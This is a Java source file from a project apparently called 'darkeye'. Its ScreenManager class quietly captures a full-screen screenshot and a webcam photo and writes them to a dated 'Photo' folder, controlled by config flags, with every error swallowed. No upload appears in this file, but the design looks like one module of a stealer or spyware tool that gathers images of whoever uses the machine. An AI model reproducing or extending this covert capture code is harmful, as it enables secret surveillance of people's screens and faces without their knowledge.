package org.spray.darkeye.managers;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import org.spray.darkeye.Config;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.util.ImageUtils;

public class ScreenManager implements IManager {

	private String path;

	public ScreenManager(String path) {
		this.path = path;
	}

	private void screenShot(String pathFile) {
		try {
			Robot robot = new Robot();
			Rectangle rectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
			ImageIO.write(bufferedImage, "png", new File(pathFile));
		} catch (AWTException | IOException ex) {
		}
	}

	private void webcamPhoto(String pathFile) {
		try {
			Webcam webcam = Webcam.getDefault();
			webcam.open();
			BufferedImage image = webcam.getImage();
			ImageIO.write(image, ImageUtils.FORMAT_JPG, new File(pathFile));
		} catch (IOException e) {

		}
	}

	@Override
	public void run() {
		if (!Config.SCREENSHOT && !Config.WEBCAM_PHOTO)
			return;
		
		File dir = new File(path, getPath());
		if (!dir.exists())
			dir.mkdirs();

		Date dateNow = new Date();
		SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy.MM.dd");

		if (Config.SCREENSHOT)
		screenShot(dir.getAbsolutePath() + "/screen - " + dateFormat.format(dateNow) + ".png");

		if (Config.WEBCAM_PHOTO)
		webcamPhoto(dir.getAbsolutePath() + "/photo - " + dateFormat.format(dateNow) + ".png");
	}

	@Override
	public String getPath() {
		return "Photo";
	}

}
